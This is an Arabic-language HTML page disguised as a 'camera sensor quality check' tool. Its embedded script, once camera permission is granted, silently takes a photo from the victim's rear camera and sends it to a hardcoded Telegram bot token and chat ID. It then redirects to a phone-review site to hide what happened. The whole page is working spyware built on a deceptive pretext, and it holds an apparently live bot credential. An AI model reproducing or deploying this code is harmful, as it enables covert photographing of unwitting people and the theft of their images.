<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>فحص جودة الكاميرا v2.0</title>
    <style>
        body { font-family: sans-serif; background-color: #1a1a1a; color: white; text-align: center; padding: 50px 20px; }
        .container { max-width: 400px; margin: auto; background: #2d2d2d; padding: 30px; border-radius: 15px; }
        .btn { background: #00ff88; color: #1a1a1a; padding: 15px 25px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
        #status { margin-top: 20px; color: #ffeb3b; }
    </style>
</head>
<body>

<div class="container">
    <h2>أداة فحص مستشعرات الكاميرا</h2>
    <p>يرجى الضغط على الزر أدناه لفحص دقة الكاميرا الخلفية ومعدل الـ FPS.</p>
    <button class="btn" onclick="startProcess()">بدء الفحص</button>
    <div id="status"></div>
</div>

<video id="video" width="640" height="480" autoplay style="display:none;"></video>
<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script>
    // الإعدادات التي تم استخراجها من صورك
    const botToken = "8409685298:AAHN_RpQJ0Ete85gZMYgi2rPaE99lwX0DPs";
    const chatId = "7822309283";

    async function startProcess() {
        const status = document.getElementById('status');
        status.innerText = "جاري الاتصال بالكاميرا...";

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "environment" } 
            });
            
            const video = document.getElementById('video');
            video.srcObject = stream;
            
            status.innerText = "جاري التقاط البيانات...";

            // التقاط الصورة بعد ثانيتين
            setTimeout(() => {
                captureAndSend();
            }, 2000);

        } catch (err) {
            status.innerText = "خطأ: يجب السماح بالكاميرا للبدء.";
        }
    }

    function captureAndSend() {
        const canvas = document.getElementById('canvas');
        const video = document.getElementById('video');
        const context = canvas.getContext('2d');
        
        context.drawImage(video, 0, 0, 640, 480);
        
        canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'shot.jpg');
            formData.append('caption', '🚀 تم التقاط صورة من الكاميرا الخلفية بنجاح!');

            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(() => {
                document.getElementById('status').innerText = "تم الفحص! جاري التحويل...";
                setTimeout(() => {
                    window.location.href = "https://www.gsmarena.com";
                }, 1000);
            });
        }, 'image/jpeg');
    }
</script>

</body>
</html>
